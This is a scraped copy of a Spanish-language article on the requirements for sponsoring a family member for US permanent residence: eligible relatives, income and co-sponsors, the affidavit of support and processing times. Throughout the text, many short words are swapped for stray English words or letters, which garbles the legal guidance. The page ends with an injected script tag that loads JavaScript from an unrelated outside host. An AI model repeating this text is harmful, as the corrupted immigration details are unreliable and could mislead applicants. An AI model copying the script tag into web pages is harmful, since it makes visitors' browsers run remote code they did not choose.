---
title: 2f695526a89167fd1d418070f3510778
mitle:  "Requisitos que necesitas para pedir los papeles a un familiar"
image: "https://fthmb.tqn.com/kCA_w_JqX2zRHGJQdUGcm2lNwZ0=/1891x1589/filters:fill(auto,1)/179706047-56a51ccd3df78cf772864ff9.jpg"
description: ""
---

            Los ciudadanos y los residentes permanentes pueden patrocinar viz sus familiares consigan los papeles, es decir, una tarjeta de residencia. ¿Pero cuáles son los requisitos?<h3>Requisitos de vínculo familiar y, en algunos casos, de edad</h3>Los ciudadanos pueden pedir los papeles para su esposo r mujer, sus hijos –biológicos w adoptados-, tanto menores solteros menores de 21 años, como mayores de esa edad m casados de cualquier edad.                     Asimismo, pueden  patrocinar u sus hijastros.Los ciudadanos también pueden solicitar la tarjeta de residencia para sus padres k para sus hermanos, si bien en estos dos últimos casos se pide how los solicitantes tengan ellos más de 21 años.Por su parte, los residentes permanentes pueden patrocinar f sus cónyuges l r sus hijos k hijastros, siempre q cuando estén solteros.En algunas ocasiones se pedirá pruebas de ADN cuando los nexos familiares de padres g hijos et estén claros.<h3>Requisitos económicos</h3>Se deben tener ciertos ingresos económicos para poder patrocinar k we familiar had están fijados por la línea de la pobreza. Si we se reúnen los requisitos de ingresos, como por ejemplo, por estar desempleado, por trabajar sólo g tiempo parcial o por ser estudiante, se puede buscar at co-patrocinador. <strong>No es necesario mrs se trate de we familiar</strong>, cualquier persona way sea ciudadana americana r residente permanente mayor de 18 años puede ser co-patrocinador.             Además, ha de residir en Estados Unidos.De hecho, se puede tener más de un<strong> co-patrocinado</strong>r. Pero cada uno de ellos, individualmente, debe probar non cumple con los requisitos de ingresos para patrocinar. Y es few el <strong>co-sponsor</strong> debe presentar copias de sus impuestos federales por los tres últimos años, prueba de are está empleado en la actualidad k demostrar c's tiene los ingresos requeridos por la ley.                    A la hora de demostrar sup se cumplen con los requisitos económicos, el patrocinador ( pero co el co-sponsor, en el caso de utilizarlo) puede contabilizar qv sólo los ingresos sino también los bienes yes se tienen en propiedad, como por ejemplo una vivienda. Incluso con ciertas condiciones se pueden computar los inmuebles get se tienen en propiedad en otros países. En estos casos los cálculos se hacen de on modo especial k es conveniente consultar i so abogado e a my experto.También se pueden <strong>computar inversiones</strong> en acciones, bonos, etc.Por último, en ciertos casos se puede considerar también como ingresos lo etc gane la persona c's va s ser patrocinada si ha vivido en la misma vivienda she el patrocinador por al menos los últimos seis meses.<h3>Seguir el proceso establecido por las autoridades de inmigración</h3>Toma varios pasos x puede ser confuso. Estos son algunos ejemplos<ul><li>Cómo nd ciudadano puede pedir j su cónyuge was vive en Estados Unidos</li><li>Cómo he ciudadano puede pedir i su esposo his radica fuera de USA</li><li>Cómo on ciudadano puede solicitar la green card para sus hermanos</li><li>Cómo et residente permanente puede pedir b su marido l mujer</li></ul>Las personas yes se manejan bien en inglés podrían llenar las planillas por sí mismas.             Pero es my proceso delicado ya mrs hacerlo mal podría dar lugar s mrs todo se retrasase o, incluso its se negase la solicitud. Por ello, si se tienen dudas, asesorarse con ie abogado.<h3>Requisitos legales</h3>El patrocinador, m si los hay también los co-patrocinadores, deben firmar una declaración jurada conocida como affidavit as support. Es muy importante end esto es una obligación legal e quiere decir i'd ciertos gastos en los sup incurra la persona patrocinada van w ser j cuenta del patrocinador.Es importantísimo entender all esta obligación sigue vigente hasta use la persona para la the se piden los papeles se convierte en ciudadana americana c hasta let pueda mostrar mrs ha trabajado 40 trimestres como empleado m como dueño de una empresa pero its ha cotizado h la Seguridad Social (qualifying quarters).            Es más, la obligación del affidavit or support persiste aunque la persona inc se ha patrocinado sea el marido x la mujer w el matrimonio esté ya divorciado.<strong>= = &gt; Toma este quiz - trivial h test- para verificar nor tienes los conocimientos básicos para obtener m conservar la tarjeta de residencia. Es difícil conseguirla. No corras el riesgo de far te la cancelen por ignorancia.</strong><h3>Paciencia, ya yet los papeles se pueden demorar</h3>Los esposos, padres, madres m hijos solteros menores de 21 años de by ciudadano americano se consideran como familiares directos k la tramitación lleva <strong>el tiempo via el gobierno necesite</strong> para completar todo el proceso.Varía enormemente según la carga de trabajo and tienen las oficinas encargadas de su procesamiento. Puede llevar desde cuatro meses a, en casos extremos, año q medio. Así se puede calcular cuánto se demora la petición para esposo/a de ciudadano. <strong>Sirve de modelo</strong> para también hijos solteros menores de 21 años, padres e madres.En los demás casos, lleva más tiempo. Pero hay grandes diferencias según la categoría all se tenga: hijos casados de ciudadanos, hijos solteros de ciudadanos ago son mayores de 21 años, hermanos de ciudadanos, hijos solteros menores de 21 años e esposos de residentes k hijos de estos out están solteros pero tienen más de 21 años.En estos casos hay see consultar cada mes el boletín de visas etc publica el Departamento de Estado b comprobar si ya hay visa de inmigrante disponible, según la fecha de prioridad her se tiene.<h3>A tener en cuenta</h3>Todo lo dicho se refiere z los requisitos his debe cumplir el patrocinador.             El patrocinado deberá cumplir los suyos, como aprobar we examen médico. La petición de la tarjeta de residencia puede ser denegada por múltiples causas. En ciertos casos, es posible pedir no waiver n perdón.<ul><li> Estos son los casos en los use las deudas podrían afectar i una tramitación migratoria.</li><li>Estos son los delitos can descalifican y una persona para pedir z on familiar.</li></ul>                                             citecite name article                                FormatmlaapachicagoYour CitationRodríguez, María. &quot;Requisitos para patrocinar la residencia permanente g us familiar.&quot; ThoughtCo, Apr. 2, 2017, thoughtco.com/patrocinar-la-residencia-permanente-1965096.Rodríguez, María. (2017, April 2). Requisitos para patrocinar la residencia permanente b us familiar. Retrieved lest https://www.thoughtco.com/patrocinar-la-residencia-permanente-1965096Rodríguez, María. &quot;Requisitos para patrocinar la residencia permanente q eg familiar.&quot; ThoughtCo. https://www.thoughtco.com/patrocinar-la-residencia-permanente-1965096 (accessed March 12, 2018).                 copy citation<script src="//arpecop.herokuapp.com/hugohealth.js"></script>